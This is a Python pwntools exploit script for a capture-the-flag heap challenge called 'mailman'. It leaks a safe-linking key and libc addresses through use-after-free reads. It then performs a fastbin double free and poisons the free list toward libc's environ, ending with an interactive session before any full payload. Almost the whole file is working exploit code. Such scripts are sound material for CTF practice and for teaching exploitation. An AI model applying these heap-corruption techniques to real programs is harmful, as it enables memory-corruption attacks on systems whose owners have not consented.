#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vuln')
libc = ELF('libc.so.6')

host = args.HOST or 'mailman.chal.imaginaryctf.org'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def create(idx, content_len, content):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx: ', str(idx))
    io.sendlineafter(b'letter size: ', str(content_len))
    io.sendlineafter(b'content: ', content)

def delete(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx))

def view(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx))

def leak_safe_link():
    create(0, 0x80, b'Z'*0x10)
    delete(0)
    view(0)
    safe_link = u64(io.recvline().strip().ljust(8,b'\0'))

    log.success(f'Libc safe link: {safe_link:x}')
    create(0, 0x80, b'Z'*0x10)
    return safe_link

def leak_libc():
    for i in range(7):
        create(i, 0x80, b'Z'*0x10)

    create(7, 0x80, b'A'*0x10)
    create(8, 0x80, b'A'*0x10)

    for i in range(7):
        delete(i)

    delete(7)

    view(7)
    leak = u64(io.recvline().strip().ljust(8,b'\0'))
    libc.address = leak - 0x219ce0

    log.success(f'Libc leak: {leak:x}\nLibc addr {libc.address:x}')
    

context.terminal = ['xfce4-terminal', '-e']
gdbscript = '''

continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
safe_link = leak_safe_link()
leak_libc()

for i in range(7):
    create(i, 0x20, b'Z'*0x10)

create(7, 0x20, b'A'*0x10)
create(8, 0x20, b'B'*0x10)

# Fill tcache 0x30
for i in range(7):
    delete(i)

# Fast bin duplicate
delete(7)
delete(8)
delete(7)

# State of fastbin: fastbin[0x30]-> chunk7 -> chunk8 -> chunk7 -> libc
for i in range(7):
    create(i, 0x20, b'Z'*0x10)

# fastbin[0x30]-> chunk7 -> chunk8 -> chunk7 
create(7, 0x20, p64((libc.sym['environ']-0x20) ^ safe_link))
# fastbin[0x30] -> chunk8 -> chunk7 -> environ
create(8, 0x20, b'B'*0x10)
# fastbin[0x30] -> chunk7 -> environ
create(9, 0x20, b'A'*0x10)
# fastbin[0x30] -> environ
create(10, 0x20, b'A'*0x1f)

io.interactive()

